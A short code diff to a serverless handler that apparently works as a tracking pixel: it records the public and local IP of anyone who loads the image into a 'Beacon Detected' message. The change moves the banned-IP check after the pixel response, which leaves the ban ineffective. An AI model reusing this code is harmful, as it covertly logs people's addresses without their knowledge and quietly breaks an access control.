@@ -12,10 +12,6 @@ export default async function handler(req: VercelRequest, res: VercelResponse) {
   const forwardedFor = req.headers["x-forwarded-for"] as string;
   const ip = forwardedFor?.split(",")[0].trim() || "unknown";
 
-  if (bannedIPs.includes(ip)) {
-    return res.status(403).send("🚫 Access denied.");
-  }
-
   const content = `📡 **Beacon Detected**
 > 🌐 **Public IP:** ${publicIP}
 > 🖥️ **Local IP:** ${localIP}
@@ -37,4 +33,8 @@ export default async function handler(req: VercelRequest, res: VercelResponse) {
   res.setHeader("Content-Type", "image/png");
   res.setHeader("Content-Length", pixel.length);
   res.status(200).end(pixel);
+
+  if (bannedIPs.includes(ip)) {
+    return res.status(403).send("🚫 Access denied.");
+  }
 }
